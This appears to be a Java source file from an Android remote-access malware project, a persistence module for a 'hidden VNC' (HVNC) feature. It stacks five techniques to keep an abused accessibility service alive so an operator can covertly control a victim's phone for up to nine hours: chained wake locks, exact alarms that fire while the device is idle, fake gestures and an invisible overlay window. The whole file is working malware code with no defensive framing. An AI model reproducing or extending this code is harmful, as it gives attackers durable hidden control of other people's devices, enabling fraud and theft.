package com.fason.app.features.hvnc;

import android.accessibilityservice.GestureDescription;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;

/**
 * v4.0 — AccessibilityKeepalive
 *
 * Five stacked methods to prevent the accessibility service from being killed
 * by the OS, OEM battery managers, or inactivity timeouts — enabling stable
 * 9-hour HVNC streams.
 *
 * Method 1: PowerManager.PARTIAL_WAKE_LOCK — held while service is connected.
 * Method 2: AlarmManager.setExactAndAllowWhileIdle — pings service every 4min.
 * Method 3: Periodic zero-duration gesture — prevents OEM "idle service" kill.
 * Method 4: TYPE_ACCESSIBILITY_OVERLAY invisible 1x1 view — anchors to display mgr.
 * Method 5: WakeLock renewal loop via HandlerThread — refreshes WakeLock before timeout.
 */
public final class AccessibilityKeepalive {
    private static final String TAG = "A11yKeepalive";
    private static volatile AccessibilityKeepalive instance;

    private static final long ALARM_INTERVAL_MS = 4 * 60 * 1000L;      // 4 minutes
    private static final long GESTURE_PING_MS   = 8 * 60 * 1000L;      // 8 minutes
    private static final long WAKELOCK_RENEW_MS = 50 * 60 * 1000L;     // 50 minutes

    private PowerManager.WakeLock wakeLock;
    private View overlayAnchor;
    private HandlerThread keepaliveThread;
    private Handler keepaliveHandler;
    private volatile boolean running = false;

    // Gesture ping — dispatches a 0,0 zero-duration path to signal activity
    private final Runnable gesturePingTask = new Runnable() {
        @Override
        public void run() {
            if (!running) return;
            try {
                FasonAccessibilityService svc = FasonAccessibilityService.getInstance();
                if (svc != null) {
                    Path p = new Path();
                    p.moveTo(0, 0);
                    GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 1);
                    GestureDescription g = new GestureDescription.Builder().addStroke(s).build();
                    svc.dispatchGesture(g, null, null);
                    Log.d(TAG, "Gesture ping sent");
                }
            } catch (Exception ignored) {}
            if (running && keepaliveHandler != null) {
                keepaliveHandler.postDelayed(this, GESTURE_PING_MS);
            }
        }
    };

    // WakeLock renewal — releases and re-acquires before the timeout window
    private final Runnable wakeLockRenewTask = new Runnable() {
        @Override
        public void run() {
            if (!running) return;
            renewWakeLock();
            if (running && keepaliveHandler != null) {
                keepaliveHandler.postDelayed(this, WAKELOCK_RENEW_MS);
            }
        }
    };

    private AccessibilityKeepalive() {}

    public static AccessibilityKeepalive getInstance() {
        if (instance == null) {
            synchronized (AccessibilityKeepalive.class) {
                if (instance == null) instance = new AccessibilityKeepalive();
            }
        }
        return instance;
    }

    /** Called from FasonAccessibilityService.onServiceConnected() */
    public void onServiceConnected() {
        if (running) return;
        running = true;
        Log.i(TAG, "Starting accessibility keepalive stack");

        startHandlerThread();
        acquireWakeLock();           // Method 1
        scheduleAlarm();             // Method 2
        scheduleGesturePing();       // Method 3
        attachOverlayAnchor();       // Method 4
        scheduleWakeLockRenewal();   // Method 5
    }

    /** Called from FasonAccessibilityService.onDestroy() */
    public void onServiceDestroyed() {
        running = false;
        cancelAlarm();
        detachOverlayAnchor();
        releaseWakeLock();
        stopHandlerThread();
        Log.i(TAG, "Accessibility keepalive stopped");
    }

    // ─── Method 1: PARTIAL_WAKE_LOCK ─────────────────────────────────────────

    private void acquireWakeLock() {
        try {
            Context ctx = FasonApp.getContext();
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            if (wakeLock != null && wakeLock.isHeld()) return;
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "fason:a11y_keepalive"
            );
            wakeLock.setReferenceCounted(false);
            // 55-minute timeout — renewed before expiry by Method 5
            wakeLock.acquire(55 * 60 * 1000L);
            Log.d(TAG, "WakeLock acquired");
        } catch (Exception e) {
            Log.w(TAG, "WakeLock acquire failed", e);
        }
    }

    private void renewWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            acquireWakeLock();
            Log.d(TAG, "WakeLock renewed");
        } catch (Exception e) {
            Log.w(TAG, "WakeLock renew failed", e);
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "WakeLock released");
            }
        } catch (Exception ignored) {}
        wakeLock = null;
    }

    // ─── Method 2: AlarmManager exact ping ───────────────────────────────────

    private void scheduleAlarm() {
        try {
            Context ctx = FasonApp.getContext();
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent intent = new Intent(Protocol.BC_A11Y_KEEPALIVE);
            intent.setPackage(ctx.getPackageName());
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, 9999, intent, flags);
            long triggerAt = SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            }
            Log.d(TAG, "Alarm scheduled");
        } catch (Exception e) {
            Log.w(TAG, "Alarm schedule failed", e);
        }
    }

    private void cancelAlarm() {
        try {
            Context ctx = FasonApp.getContext();
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent intent = new Intent(Protocol.BC_A11Y_KEEPALIVE);
            intent.setPackage(ctx.getPackageName());
            int flags = PendingIntent.FLAG_NO_CREATE;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, 9999, intent, flags);
            if (pi != null) am.cancel(pi);
        } catch (Exception ignored) {}
    }

    /** Called from WatchdogReceiver when a11yKeepAlive broadcast arrives — reschedule. */
    public void onAlarmReceived() {
        if (!running) return;
        renewWakeLock();
        scheduleAlarm(); // reschedule next alarm
        Log.d(TAG, "Alarm received, rescheduled");
    }

    // ─── Method 3: Periodic gesture ping ─────────────────────────────────────

    private void scheduleGesturePing() {
        if (keepaliveHandler == null) return;
        keepaliveHandler.removeCallbacks(gesturePingTask);
        keepaliveHandler.postDelayed(gesturePingTask, GESTURE_PING_MS);
    }

    // ─── Method 4: TYPE_ACCESSIBILITY_OVERLAY invisible anchor view ──────────

    private void attachOverlayAnchor() {
        if (overlayAnchor != null) return;
        try {
            Context ctx = FasonApp.getContext();
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) return;
            overlayAnchor = new View(ctx);
            overlayAnchor.setVisibility(View.INVISIBLE);
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.x = 0;
            params.y = 0;
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    wm.addView(overlayAnchor, params);
                    Log.d(TAG, "Overlay anchor attached");
                } catch (Exception e) {
                    Log.w(TAG, "Overlay anchor failed", e);
                    overlayAnchor = null;
                }
            });
        } catch (Exception e) {
            Log.w(TAG, "attachOverlayAnchor failed", e);
        }
    }

    private void detachOverlayAnchor() {
        if (overlayAnchor == null) return;
        try {
            Context ctx = FasonApp.getContext();
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            final View v = overlayAnchor;
            overlayAnchor = null;
            new Handler(Looper.getMainLooper()).post(() -> {
                try { if (wm != null) wm.removeView(v); } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    // ─── Method 5: WakeLock renewal scheduling ────────────────────────────────

    private void scheduleWakeLockRenewal() {
        if (keepaliveHandler == null) return;
        keepaliveHandler.removeCallbacks(wakeLockRenewTask);
        keepaliveHandler.postDelayed(wakeLockRenewTask, WAKELOCK_RENEW_MS);
    }

    // ─── Handler thread ───────────────────────────────────────────────────────

    private void startHandlerThread() {
        if (keepaliveThread == null || !keepaliveThread.isAlive()) {
            keepaliveThread = new HandlerThread("A11yKeepalive");
            keepaliveThread.start();
            keepaliveHandler = new Handler(keepaliveThread.getLooper());
        }
    }

    private void stopHandlerThread() {
        if (keepaliveHandler != null) {
            keepaliveHandler.removeCallbacks(gesturePingTask);
            keepaliveHandler.removeCallbacks(wakeLockRenewTask);
        }
        if (keepaliveThread != null) {
            try { keepaliveThread.quitSafely(); } catch (Exception ignored) {}
            keepaliveThread = null;
        }
        keepaliveHandler = null;
    }
}
